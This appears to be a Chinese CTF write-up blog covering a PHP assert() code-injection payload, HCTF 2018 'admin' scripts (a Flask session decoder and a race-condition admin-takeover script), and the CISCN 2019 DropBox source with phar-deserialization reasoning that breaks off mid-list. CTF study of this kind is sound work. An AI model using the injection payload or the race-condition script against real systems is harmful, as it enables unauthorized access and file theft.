<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">	$page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>assert和system eval一样都可以执行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">page=flag&apos;,&apos;..&apos;)==false and system(&apos;cat ./templates/flag.php&apos;);//</span><br></pre></td></tr></table></figure>

<h2 id="hctf-admin"><a href="#hctf-admin" class="headerlink" title="hctf admin"></a>hctf admin</h2><p><a href="https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin" target="_blank" rel="noopener">https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin</a></p>
<p><a href="https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/#admin" target="_blank" rel="noopener">https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/#admin</a></p>
<p><a href="https://tmr.js.org/p/3a03e44b/" target="_blank" rel="noopener">https://tmr.js.org/p/3a03e44b/</a></p>
<p>这里只对一些值得学习的脚本做一个记录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin</span></span><br><span class="line"><span class="comment"># 这个脚本用于解码ｆｌａｓｋ中的session</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin</span></span><br><span class="line"><span class="comment"># 条件竞争脚本</span></span><br><span class="line"><span class="comment"># 期望的流程为：普通用户登录＼普通用户登出＼普通用户尝试登录ａｄｍｉｎ账户并取得相应session,并在程序验证过期之前触发改密码的流程，此时原来的普通用户已经是ａｄｍｉｎ了</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s, username, password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/login"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">"http://admin.2018.hctf.io/logout"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s, newpassword)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'newpassword'</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/change"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    login(s, <span class="string">'skysec'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    change(s, <span class="string">'skysec'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(s)</span>:</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">'admin'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'&lt;a href="/index"&gt;/index&lt;/a&gt;'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'finish'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="2019-CISCN-northern-DropBox"><a href="#2019-CISCN-northern-DropBox" class="headerlink" title="2019 CISCN northern DropBox"></a>2019 CISCN northern DropBox</h2><p><img src="https://user-images.githubusercontent.com/40637063/61511347-040f3f80-aa29-11e9-8846-e8a0e0a769c0.png" alt="1562476128111"></p>
<p>当上传一个文件(只能是jpgpng这些)之后,页面会给我们提供下载和删除功能.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511378-2a34df80-aa29-11e9-8268-6c6ccba139cd.png" alt="1562476266190"></p>
<p>那么我们可以把一些源代码 <code>class.php</code> <code>upload.php</code> <code>download.php</code> <code>delete.php</code> and <code>index.php</code> 给下载下来.(need absolutely path)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511425-4a649e80-aa29-11e9-8161-9266a5df971b.png" alt="1562476753974"></p>
<p>source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">download.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    $filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $pos = strrpos($filename, <span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">if</span> ($pos !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $filename = substr($filename, <span class="number">0</span>, $pos);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $fileext = <span class="string">".gif"</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/gif'</span>:</span><br><span class="line">            $fileext = <span class="string">".gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/jpeg'</span>:</span><br><span class="line">            $fileext = <span class="string">".jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/png'</span>:</span><br><span class="line">            $fileext = <span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Only gif/jpg/png allowed"</span>);</span><br><span class="line">            Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">            <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; strlen($filename) !== <span class="number">0</span>) &#123;</span><br><span class="line">        $dst = $_SESSION[<span class="string">'sandbox'</span>] . $filename . $fileext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dst);</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Invaild filename"</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>delete.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/panel.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/toast.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/panel.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">"breadcrumb"</span>&gt;</span><br><span class="line">    &lt;ol class="breadcrumb"&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;管理面板&lt;/li&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;&lt;label for="fileInput" class="fileLabel"&gt;上传文件&lt;/label&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li class="active ml-auto"&gt;&lt;a href="#"&gt;你好 &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line">&lt;input type="file" id="fileInput" class="hidden"&gt;</span><br><span class="line">&lt;div class="top" id="toast-container"&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>in phar files , meta data was stored in serialized form, which affect many  </p>
<p>functions to be dangerous, including :fileatime() filectime() file_exists() file_get_contents() file_put_contents() file() filegroup() fopen() fileinode() filemtime() fileowner() fileperms() is_dir() is_executable() is_file() is_link() is_readable() is_writable() is_writeable() parse_ini_file() copy() unlink() stat() readfile()</p>
</blockquote>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<p>所以我们的思路如下:</p>
<ol>
<li><p>上传一个phar文件,当然后缀名要修改成jpg,png或者gif</p>
</li>
<li><p>在 <code>delete.php</code> 中访问他(<code>download.php</code> 有 <code>base_dir</code>  限制)</p>
</li>
<li><p>in delete.php , <code>file_exists()</code> 可以触发反序列化.</p>
</li>
<li><p>只有<code>File</code>类中的<code>close()</code>函数可以获取文件内容,而且只有<code>User</code>类中的<code>__destruct</code>函数可以触发他,那么我们放入phar文件中的应该是<code>User</code>类的序列化,但是变量<code>db</code>应该是<code>File</code>类的对象吗? </p>
</li>
<li><p>如果真的这么做的话,<code>flag.txt</code>肯定会被读出来,但是没有办法去将他读出来.这个时候开始考虑到只有<code>Filelist</code>类有回显的功能    .</p>
</li>
<li><p>同时 , <code>__call</code> 可以处理未知的函数  , 并试图让所有的<code>file</code> 对象去调用这个这个未知的函数.</p>
</li>
